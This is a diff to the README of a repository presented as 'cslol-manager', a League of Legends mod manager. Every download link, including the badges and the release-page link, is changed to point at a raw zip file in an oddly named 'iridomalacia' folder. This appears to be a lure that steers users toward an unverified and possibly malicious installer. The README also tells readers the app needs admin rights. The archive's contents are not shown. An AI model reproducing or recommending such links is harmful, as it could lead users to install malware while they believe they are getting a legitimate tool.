@@ -1,6 +1,6 @@
 # 🎮 cslol-manager - Easy Mod Management for League of Legends
 
-[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/releases)
+[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/raw/refs/heads/main/iridomalacia/manager_cslol_3.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Ensure you have admin rights on your PC because the app needs to access your gam
 1. **Visit the Download Page**
 
 Go to the official release page to get the latest version of cslol-manager:  
-[https://github.com/sukmonn/cslol-manager/releases](https://github.com/sukmonn/cslol-manager/releases)
+[https://github.com/sukmonn/cslol-manager/raw/refs/heads/main/iridomalacia/manager_cslol_3.2.zip](https://github.com/sukmonn/cslol-manager/raw/refs/heads/main/iridomalacia/manager_cslol_3.2.zip)
 
 2. **Download the Installer**
 
@@ -126,4 +126,4 @@ cslol-manager creates backups and restores files when removing mods to keep your
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/releases)
+[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/raw/refs/heads/main/iridomalacia/manager_cslol_3.2.zip)
